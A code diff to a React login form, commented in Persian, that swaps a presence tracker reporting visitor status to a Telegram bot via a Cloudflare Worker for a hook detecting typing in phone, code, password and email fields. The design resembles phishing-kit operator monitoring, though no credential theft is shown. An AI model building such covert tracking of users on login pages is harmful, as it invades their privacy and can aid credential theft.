@@ -114,100 +114,37 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-  // سیستم بهینه شده تشخیص حضور کاربر
+  // سیستم جامع مدیریت حضور و تشخیص تایپ
+  const presence = useCompletePresence("LoginForm", sessionId || "", {
+    typingConfig: {
+      debounceTime: 2000, // 2 ثانیه برای LoginForm
+      minChars: 1,
+      enabledFields: ["phone", "code", "password", "email"], // فیلدهای مجاز
+    },
+  });
+
+  // نمایش آمار عملکرد در console (فقط برای development)
   useEffect(() => {
-    if (sessionId) {
-      console.log(
-        "🚀 شروع ردیابی بهینه شده برای جلسه:",
-        sessionId,
-        "- مرحله فعلی:",
-        currentStep,
-      );
-
-      const handlePresenceChange = async (
-        state: OptimizedPresenceState,
-        changeType: PresenceChangeType,
-      ) => {
-        console.log("📡 تغییر حضور کاربر:", {
-          sessionId,
-          presenceLevel: state.presenceLevel,
-          isOnline: state.isOnline,
-          isActive: state.isActive,
-          isVisible: state.isVisible,
-          hasNetwork: state.hasNetworkConnection,
-          changeType,
+    if (presence.isInitialized && sessionId) {
+      const interval = setInterval(() => {
+        const stats = presence.stats;
+        console.log("📊 [LOGIN FORM] آمار جامع حضور:", {
+          form: "LoginForm",
           currentStep,
-          lastActivity: new Date(state.lastActivity).toLocaleString("fa-IR"),
+          presence: {
+            level: presence.presenceLevel,
+            isOnline: presence.isOnline,
+            isTyping: presence.isTyping,
+            statusText: presence.statusText,
+          },
+          global: stats.globalStats,
+          typing: stats.typingStats,
         });
+      }, 30000); // هر 30 ثانیه
 
-        console.log("📤 ارسال وضعیت به تلگرام:", {
-          statusText: optimizedPresenceTracker.getStatusText(),
-          statusEmoji: optimizedPresenceTracker.getStatusEmoji(),
-          presenceLevel: state.presenceLevel,
-        });
-
-        // استفاده از Smart Status Manager برای ارسال بهینه
-        const result = await smartStatusManager.sendStatusUpdate(
-          sessionId,
-          state,
-          changeType,
-          optimizedPresenceTracker.getStatusText(),
-          optimizedPresenceTracker.getStatusEmoji(),
-        );
-
-        if (result.sent) {
-          console.log("✅ به‌روزرسانی حضور با موفقیت ارسال شد");
-
-          // نمایش آمار عملکرد (فقط برای heartbeat)
-          if (changeType === "heartbeat") {
-            const trackerStats = optimizedPresenceTracker.getPerformanceStats();
-            const managerStats = smartStatusManager.getPerformanceStats();
-            console.log("📊 آمار عملکرد کامل:", {
-              tracker: {
-                currentLevel: trackerStats.currentLevel,
-                timeSinceActivity: `${Math.round(trackerStats.timeSinceLastActivity / 1000)}s`,
-                rateLimiter: trackerStats.rateLimiter,
-              },
-              statusManager: {
-                updatesInLastMinute: managerStats.updatesInLastMinute,
-                totalSessions: managerStats.totalSessions,
-              },
-            });
-          }
-        } else if (result.error) {
-          console.error("❌ خطا در ارسال به‌روزرسانی حضور:", result.error);
-
-          // تشخیص خطا و اجرای diagnostic در صورت لزوم
-          if (result.error.message.includes("Failed to fetch")) {
-            console.log("🔍 اجرای تشخیص تلگرام به دلیل خطای fetch...");
-            setTimeout(() => {
-              quickDebug().then((diagnostic) => {
-                if (!diagnostic.results.workerConnectivity?.success) {
-                  console.error("🚨 Cloudflare Worker در دسترس نیست!");
-                } else if (!diagnostic.results.botAPI?.success) {
-                  console.error("🚨 API ربات تلگرام کار نمی‌کند!");
-                }
-              });
-            }, 1000);
-          }
-        } else {
-          // ارسال رد شده (به دلیل throttling یا تکراری بودن)
-          console.log(`⏭️ ارسال رد شد: ${result.reason}`);
-        }
-      };
-
-      // شروع ردیابی بهینه شده
-      optimizedPresenceTracker.start(sessionId, handlePresenceChange);
-
-      return () => {
-        console.log("🛑 توقف ردیابی بهینه شده");
-        optimizedPresenceTracker.stop();
-
-        // پاکسازی تاریخچه جلسه در Smart Status Manager
-        smartStatusManager.clearSessionHistory(sessionId);
-      };
+      return () => clearInterval(interval);
     }
-  }, [sessionId, currentStep]);
+  }, [presence.isInitialized, sessionId, currentStep, presence]);
 
   // Countdown timer for verify-phone step
   useEffect(() => {
@@ -2505,7 +2442,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    رمز ��بور را فراموش کرده‌اید؟
+                    رمز عبور را فراموش کرده‌اید؟
                   </p>
                   <a
                     href="#"
